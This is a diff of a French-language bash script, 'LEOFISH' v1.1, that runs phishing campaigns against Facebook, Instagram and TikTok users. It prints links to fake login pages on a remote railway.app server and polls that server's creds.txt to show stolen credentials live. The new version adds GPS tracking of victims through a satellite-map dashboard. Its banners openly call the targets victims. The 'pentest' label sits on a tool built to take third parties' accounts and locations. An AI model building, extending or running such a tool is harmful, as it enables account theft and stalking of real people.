@@ -1,6 +1,6 @@
 #!/bin/bash
 # ══════════════════════════════════════════
-#         LEOFISH PENTEST TERMINAL
+#         LEOFISH PENTEST TERMINAL v1.1
 # ══════════════════════════════════════════
 
 # Couleurs
@@ -17,8 +17,8 @@ NC='\033[0m'
 CREDIT_FILE="credit.text"
 HELP_FILE="help.text"
 
-# URL Render
-APP_URL="https://leofish-tool-v1-0.onrender.com"
+# URL Render/Railway
+APP_URL="https://leofish-tool-v10-production.up.railway.app"
 
 # Créer dossier sessions
 mkdir -p sessions
@@ -34,203 +34,165 @@ show_banner() {
     fi
     echo -e "${NC}"
     echo -e "${WHITE}╔══════════════════════════════════════════════════════════════════════╗${NC}"
-    echo -e "${WHITE}║${YELLOW}                    LEOFISH TERMINAL v1.0            ${WHITE}║${NC}"
-    echo -e "${WHITE}║${GREEN}                    Victim → Hacker Monitoring        ${WHITE}║${NC}"
+    echo -e "${WHITE}║${YELLOW}                    LEOFISH TERMINAL v1.1 + GPS           ${WHITE}║${NC}"
+    echo -e "${WHITE}║${GREEN}                    Victim → Hacker GPS Tracking        ${WHITE}║${NC}"
     echo -e "${WHITE}╚══════════════════════════════════════════════════════════════════════╝${NC}"
     echo ""
 }
 
 # ══════════════════════════════════════════
-# GÉNÉRER LIEN + MONITORING (AVEC SÉLECTION)
+# GÉNÉRER LIEN + MONITORING
 # ══════════════════════════════════════════
 generate_campaign() {
     show_banner
-    echo -e "${PURPLE}🎯 NOUVELLE CAMPAGNE DE PHISH${NC}"
+    echo -e "${PURPLE}🎯 NOUVELLE CAMPAGNE DE PHISH + GPS${NC}"
     echo ""
-    
-    # Sélection de la plateforme
-    echo -e "${WHITE}Choisissez la plateforme à faire attaque :${NC}"
-    echo -e "  ${GREEN}1)${NC}  Facebook"
-    echo -e "  ${GREEN}2)${NC}  Instagram"
-    echo -e "  ${GREEN}3)${NC}  TikTok"
+
+    echo -e "${WHITE}Choisissez la plateforme :${NC}"
+    echo -e "  ${GREEN}1)${NC} Facebook"
+    echo -e "  ${GREEN}2)${NC} Instagram" 
+    echo -e "  ${GREEN}3)${NC} TikTok"
+    echo -e "  ${GREEN}4)${NC} GPS Dashboard"
     echo ""
-    read -rp "$(echo -e "${WHITE}Votre choix (1/2/3) : ${NC}")" platform_choice
+    read -rp "$(echo -e "${WHITE}Choix (1-4) : ${NC}")" platform_choice
 
     case $platform_choice in
-        1|1)
-            PLATFORM="facebook"
-            PAGE="index.php"
-            ;;
-        2|2)
-            PLATFORM="instagram"
-            PAGE="instagramlogin.php"
-            ;;
-        3|3)
-            PLATFORM="tiktok"
-            PAGE="tiktoklogin.php"
-            ;;
-        *)
-            echo -e "${RED}❌ Choix invalide. Retour au menu.${NC}"
-            sleep 2
+        1) PLATFORM="facebook"; PAGE="index.php" ;;
+        2) PLATFORM="instagram"; PAGE="instagramlogin.php" ;;
+        3) PLATFORM="tiktok"; PAGE="tiktoklogin.php" ;;
+        4) 
+            echo -e "${GREEN}🛰️ GPS DASHBOARD: ${CYAN}${APP_URL}/gps.php${NC}"
+            echo -e "${YELLOW}📍 Carte satellite live avec toutes positions GPS${NC}"
+            read -rp "$(echo -e "${WHITE}Entrée pour continuer...${NC}")"
             return
             ;;
+        *) echo -e "${RED}❌ Choix invalide${NC}"; sleep 2; return ;;
     esac
 
-    # Ping Render pour le réveiller
-    echo -e "${YELLOW}⚡ Connexion au serveur Render...${NC}"
-    curl -s --max-time 15 "$APP_URL" > /dev/null 2>&1
-    if [ $? -eq 0 ]; then
-        echo -e "${GREEN}✅ Serveur en ligne${NC}"
-    else
-        echo -e "${YELLOW}⚠️  Serveur en démarrage (Render cold start, patiente 30s...)${NC}"
-    fi
-    echo ""
+    # Wake up server
+    echo -e "${YELLOW}⚡ Wake up server...${NC}"
+    curl -s "$APP_URL" > /dev/null
 
-    # ID unique de session
-    SESSION_ID=$(date +%s)_$(openssl rand -hex 8 2>/dev/null || echo $RANDOM$RANDOM)
+    # Session ID
+    SESSION_ID=$(date +%s)_$(openssl rand -hex 4 2>/dev/null || echo $RANDOM)
+    PHISH_LINK="${APP_URL}/${PAGE}"
 
-    # Lien spécifique selon la plateforme
-    PHISH_LINK="${APP_URL}/${PAGE}?session=${SESSION_ID}"
-
-    # Log local
+    # Log session
     SESSION_LOG="sessions/${SESSION_ID}_${PLATFORM}.log"
-    echo "=== SESSION PENTEST $(date) - Plateforme: $PLATFORM ===" > "$SESSION_LOG"
+    echo "=== LEOFISH $(date) - $PLATFORM ===" > "$SESSION_LOG"
     echo "Lien: $PHISH_LINK" >> "$SESSION_LOG"
 
     echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
-    echo -e "${GREEN}║${WHITE}  ✅  LIEN GÉNÉRÉ ($PLATFORM) — ENVOIE À LA CIBLE :                ${GREEN}║${NC}"
+    echo -e "${GREEN}║${WHITE}  🎣 LIEN PHISH ($PLATFORM) :                           ${GREEN}║${NC}"
     echo -e "${GREEN}╠══════════════════════════════════════════════════════════════════════╣${NC}"
     echo -e "${GREEN}║  ${CYAN}${PHISH_LINK}${NC}"
+    echo -e "${GREEN}║${NC}"
+    echo -e "${GREEN}║${WHITE}  🛰️ GPS LIVE MAP : ${CYAN}${APP_URL}/gps.php              ${GREEN}║${NC}"
+    echo -e "${GREEN}║${NC}"
+    echo -e "${GREEN}║${WHITE}  📺 TERMINAL WEB: ${CYAN}${APP_URL}/terminal.php         ${GREEN}║${NC}"
     echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
-    echo ""
-    echo -e "${YELLOW}📤 Copie iyo link uyihe umuntu ushaka guhakinga${NC}"
-    echo -e "${PURPLE}⏳ Dès que la cible l'ouvre, les logs apparaîtront ici${NC}"
-    echo ""
-    read -rp "$(echo -e "${WHITE}Appuie sur Entrée pour démarrer le monitoring...${NC}")"
 
-    monitor_logs "$SESSION_ID" "$SESSION_LOG" "$PLATFORM"
+    echo ""
+    read -rp "$(echo -e "${WHITE}Appuie Entrée pour monitoring live...${NC}")"
+    
+    monitor_logs "$SESSION_ID" "$SESSION_LOG"
 }
 
 # ══════════════════════════════════════════
-# MONITORING
+# MONITORING LIVE
 # ══════════════════════════════════════════
 monitor_logs() {
     local session_id=$1
     local session_log=$2
-    local platform=$3
-    local last_content=""
-
-    show_banner
-    echo -e "${RED}👁️  MONITORING LIVE${NC} — Session: ${CYAN}${session_id}${NC} [${platform^^}]"
-    echo -e "${RED}══════════════════════════════════════════════════════════════════════${NC}"
-    echo -e "${BLUE}📡 Lecture des logs depuis : ${WHITE}${APP_URL}/creds.txt${NC}"
-    echo ""
-
+    
     while true; do
-        current=$(curl -s --max-time 10 "${APP_URL}/creds.txt")
+        clear
+        show_banner
+        echo -e "${RED}👁️  LIVE MONITORING${NC} — ${CYAN}${session_id}${NC}"
+        echo -e "${RED}══════════════════════════════════════════════════════════════════════${NC}"
+        echo -e "${BLUE}📡 GPS Dashboard:${CYAN} ${APP_URL}/gps.php ${NC} | 📺 Terminal:${CYAN} ${APP_URL}/terminal.php${NC}"
+        echo -e "${RED}══════════════════════════════════════════════════════════════════════${NC}"
+        echo ""
 
-        if [ -n "$current" ] && [ "$current" != "$last_content" ]; then
-            clear
-            show_banner
-            echo -e "${RED}👁️  MONITORING LIVE${NC} — Session: ${CYAN}${session_id}${NC} [${platform^^}]"
-            echo -e "${RED}══════════════════════════════════════════════════════════════════════${NC}"
-            echo ""
-
-            while IFS= read -r line; do
-                if [ -n "$line" ]; then
-                    echo -e "${GREEN}[$(date '+%H:%M:%S')]${YELLOW} $line${NC}"
-                    echo "$(date '+%H:%M:%S') - $line" >> "$session_log"
-                fi
-            done <<< "$current"
-
-            last_content="$current"
+        # Live creds
+        if curl -s --max-time 5 "${APP_URL}/creds.txt" > /tmp/creds_live; then
+            cat /tmp/creds_live
         else
-            echo -ne "${BLUE}.${NC}"
+            echo -e "${YELLOW}⏳ Attente victimes...${NC}"
         fi
 
-        sleep 3
+        echo ""
+        echo -ne "${GREEN}[LIVE]${NC} "
+        read -t 3 -n 1
+        if [ $? -eq 0 ]; then
+            break
+        fi
     done
 }
 
 # ══════════════════════════════════════════
-# VOIR LES SESSIONS (simplifié pour la lecture)
+# SESSIONS + DASHBOARDS
 # ══════════════════════════════════════════
 show_sessions() {
     show_banner
-    echo -e "${YELLOW}📂 TOUTES LES SESSIONS PENTEST${NC}"
+    echo -e "${YELLOW}📂 SESSIONS + DASHBOARDS${NC}"
     echo ""
-
-    if [ -z "$(ls -A sessions/ 2>/dev/null)" ]; then
-        echo -e "${RED}  Aucune session enregistrée.${NC}"
-    else
-        echo -e "${CYAN}  Fichier                              Date${NC}"
-        echo -e "${WHITE}  ──────────────────────────────────────────────${NC}"
-        ls -lt sessions/ | tail -n +2 | awk '{printf "  %-35s %s %s %s\n", $9, $6, $7, $8}'
-        echo ""
-        read -rp "$(echo -e "${WHITE}Nom du fichier à ouvrir (ou Entrée pour passer) : ${NC}")" session_file
-
-        if [ -n "$session_file" ] && [ -f "sessions/$session_file" ]; then
-            echo ""
-            echo -e "${BLUE}╔══ Contenu de $session_file ══${NC}"
-            cat "sessions/$session_file"
-            echo -e "${BLUE}╚════════════════════════════════${NC}"
-        fi
+    echo -e "${CYAN}🔗 LIENS LIVE:${NC}"
+    echo -e "  📱 Facebook:    ${APP_URL}/index.php"
+    echo -e "  📸 Instagram:   ${APP_URL}/instagramlogin.php" 
+    echo -e "  🎵 TikTok:      ${APP_URL}/tiktoklogin.php"
+    echo -e "  🛰️  GPS Map:     ${APP_URL}/gps.php ${GREEN}(SATELLITE HD)${NC}"
+    echo -e "  📺 Terminal:    ${APP_URL}/terminal.php"
+    echo ""
+    
+    if [ -d "sessions" ] && [ "$(ls -A sessions)" ]; then
+        echo -e "${YELLOW}📁 Sessions locales:${NC}"
+        ls -la sessions/ | tail -n +2
     fi
-
+    
     echo ""
-    read -rp "$(echo -e "${WHITE}Entrée pour revenir...${NC}")"
+    read -rp "$(echo -e "${WHITE}Entrée...${NC}")"
 }
 
-# ══════════════════════════════════════════
-# AIDE
-# ══════════════════════════════════════════
 show_help() {
     show_banner
-    echo -e "${YELLOW}📖 GUIDE D'UTILISATION${NC}"
+    echo -e "${YELLOW}🎣 LEOFISH GPS PRO${NC}"
     echo -e "${WHITE}══════════════════════════════════════════════════════════════════════${NC}"
+    echo -e "${GREEN}1. Génère lien phish → Victim clique → GPS + creds capturés${NC}"
+    echo -e "${GREEN}2. GPS.php = Carte satellite HD avec markers live${NC}"
+    echo -e "${GREEN}3. Terminal.php = Logs ASCII en temps réel${NC}"
+    echo -e "${GREEN}4. Auto-refresh 5s sur tous dashboards${NC}"
     echo ""
-    if [ -f "$HELP_FILE" ]; then
-        cat "$HELP_FILE"
-    else
-        echo -e "${RED}  ❌ Fichier help.text introuvable.${NC}"
-    fi
-    echo ""
-    read -rp "$(echo -e "${WHITE}Entrée pour revenir...${NC}")"
+    read -rp "$(echo -e "${WHITE}Entrée...${NC}")"
 }
 
 # ══════════════════════════════════════════
-# MENU PRINCIPAL
+# MAIN MENU
 # ══════════════════════════════════════════
 main_menu() {
     while true; do
         show_banner
-        echo -e "  ${GREEN}1${NC}  ${CYAN}🎣${NC}  ${YELLOW}Nouvelle campagne${NC}  ${WHITE}(générer lien + monitoring)${NC}"
-        echo -e "  ${GREEN}2${NC}  ${CYAN}📂${NC}  ${YELLOW}Sessions enregistrées${NC}"
-        echo -e "  ${GREEN}3${NC}  ${CYAN}📖${NC}  ${YELLOW}Aide${NC}"
-        echo -e "  ${GREEN}0${NC}  ${RED}❌  Quitter${NC}"
+        echo -e "  ${GREEN}1${NC} ${CYAN}🎣${NC} Nouvelle campagne phish"
+        echo -e "  ${GREEN}2${NC} ${CYAN}📂${NC} Sessions + Dashboards live"
+        echo -e "  ${GREEN}3${NC} ${CYAN}📖${NC} Aide GPS Pro"
+        echo -e "  ${GREEN}0${NC} ${RED}❌${NC} Quitter"
         echo ""
-        read -rp "$(echo -e "  ${WHITE}LEOFISH ▶ ${NC}")" choice
+        read -rp "LEOFISH ▶ " choice
 
         case $choice in
             1) generate_campaign ;;
             2) show_sessions ;;
             3) show_help ;;
-            0) echo -e "${GREEN}✅ Session terminée. À bientôt.${NC}"; echo ""; exit 0 ;;
-            *) echo -e "${RED}  ❌ Choix invalide${NC}"; sleep 1 ;;
+            0) echo -e "${GREEN}👋 À bientôt hacker!${NC}"; exit 0 ;;
+            *) echo -e "${RED}❌ Mauvais choix${NC}"; sleep 1 ;;
         esac
     done
 }
 
-# ══════════════════════════════════════════
-# VÉRIFICATIONS AU DÉMARRAGE
-# ══════════════════════════════════════════
+# START
 if [ ! -f "$CREDIT_FILE" ]; then
-    echo -e "${RED}❌ Erreur : credit.text manquant — place ton logo dedans.${NC}"
+    echo -e "${RED}❌ credit.text manquant${NC}"
     exit 1
-fi
-
-if [ ! -f "$HELP_FILE" ]; then
-    echo -e "${YELLOW}⚠️  help.text manquant — crée le fichier pour afficher l'aide.${NC}"
 fi
 
 main_menu
